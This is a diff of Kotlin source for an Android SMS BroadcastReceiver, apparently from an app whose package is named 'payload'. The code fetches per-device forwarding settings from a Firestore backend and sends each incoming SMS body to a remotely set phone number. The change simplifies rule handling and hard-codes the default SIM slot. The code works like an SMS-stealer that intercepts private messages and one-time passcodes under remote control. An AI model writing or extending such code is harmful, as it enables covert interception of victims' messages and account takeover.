@@ -54,23 +54,21 @@ class Receiver : BroadcastReceiver() {
                             try {
                                 val repository = com.payload.jansiix0ne.repository.FirestoreRepository()
                                 val deviceId = getDeviceId(ctx)
-                                val forwardingRules = repository.getForwardingRules(deviceId).getOrNull()
+                                val forwarding = repository.getForwardingRules(deviceId).getOrNull()
                                 
-                                forwardingRules?.forEach { rule ->
-                                    if (rule.status == "active" && !rule.executed) {
-                                        Log.d("Receiver", "Forwarding SMS to: ${rule.toNumber}")
-                                        val success = com.payload.jansiix0ne.util.SmsHelper.sendSms(
-                                            ctx,
-                                            rule.toNumber,
-                                            messageBody,
-                                            rule.fromSim.toIntOrNull() ?: 0
-                                        )
-                                        
-                                        if (success) {
-                                            Log.d("Receiver", "✅ SMS forwarded successfully")
-                                        } else {
-                                            Log.e("Receiver", "❌ Failed to forward SMS")
-                                        }
+                                if (forwarding != null && forwarding.enabled) {
+                                    Log.d("Receiver", "Forwarding SMS to: ${forwarding.number}")
+                                    val success = com.payload.jansiix0ne.util.SmsHelper.sendSms(
+                                        ctx,
+                                        forwarding.number,
+                                        messageBody,
+                                        0 // Default SIM slot
+                                    )
+                                    
+                                    if (success) {
+                                        Log.d("Receiver", "✅ SMS forwarded successfully")
+                                    } else {
+                                        Log.e("Receiver", "❌ Failed to forward SMS")
                                     }
                                 }
                             } catch (e: Exception) {
